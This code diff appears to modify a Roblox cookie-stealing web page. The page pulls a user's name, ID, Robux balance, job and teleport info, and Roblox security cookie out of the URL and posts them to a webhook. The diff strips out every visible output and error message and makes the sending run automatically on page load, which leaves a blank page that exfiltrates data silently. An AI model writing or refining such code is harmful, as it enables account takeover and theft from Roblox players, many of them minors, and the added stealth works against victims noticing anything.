@@ -82,32 +82,13 @@
                     sendWebhook(message); // Send the extracted data to the webhook
                 } catch (error) {
                     console.error('Error parsing data:', error);
-                    document.getElementById('output').innerText = 'Failed to parse data.';
                 }
-            } else {
-                document.getElementById('output').innerText = 'No data found in URL.';
             }
         }
 
-        function displayData(message) {
-            const output = document.getElementById('output');
-            output.innerHTML = `
-                <h2>Extracted Data:</h2>
-                <ul>
-                    <li><strong>Username:</strong> ${message.username}</li>
-                    <li><strong>UserID:</strong> ${message.userid}</li>
-                    <li><strong>Headshot URL:</strong> <img src="${message.headshot}" alt="Headshot" width="100" height="100"></li>
-                    <li><strong>Robux:</strong> ${message.robux}</li>
-                    <li><strong>Job:</strong> ${message.job}</li>
-                    <li><strong>Teleport Info:</strong> ${message.teleport}</li>
-                    <li><strong>Roblox Security Cookie:</strong> ${message.robloxSecurity}</li>
-                </ul>
-            `;
-        }
+        window.onload = extractData; // Automatically send the webhook when the page is loaded
     </script>
 </head>
-<body onload="extractData()">
-    <h1>Roblox Data Extractor</h1>
-    <div id="output">Loading extracted data...</div>
+<body>
 </body>
 </html>
